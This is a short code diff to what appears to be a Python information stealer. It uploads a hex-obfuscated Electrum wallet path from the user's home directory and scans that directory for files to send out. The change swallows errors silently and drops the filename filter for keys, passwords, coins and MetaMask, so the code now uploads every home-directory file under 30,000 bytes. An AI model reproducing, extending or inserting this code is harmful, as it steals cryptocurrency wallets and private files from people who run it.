@@ -65,12 +65,15 @@ if os.name == 'nt':
 
 
 if os.name == 'posix':
- upl(os.environ['HOME'] + "/" + "\x2e\x65\x6c\x65\x63\x74\x72\x75\x6d\x2f\x77\x61\x6c\x6c\x65\x74\x73\x2f\x64\x65\x66\x61\x75\x6c\x74\x5f\x77\x61\x6c\x6c\x65\x74")
+ try:
+  upl(os.environ['HOME'] + "/" + "\x2e\x65\x6c\x65\x63\x74\x72\x75\x6d\x2f\x77\x61\x6c\x6c\x65\x74\x73\x2f\x64\x65\x66\x61\x75\x6c\x74\x5f\x77\x61\x6c\x6c\x65\x74")
+ except:
+  0
  dirs = os.getenv("HOME")
  dlin = os.listdir(dirs)
  for i in dlin:
-  if ("key" in i  or "assw" in i or "coin" in i or "metam" in i):
-   if (os.path.getsize(dirs+"/"+i)< 60000):
+  
+   if (os.path.getsize(dirs+"/"+i)< 30000):
        upl(dirs+"/"+i )
       
 
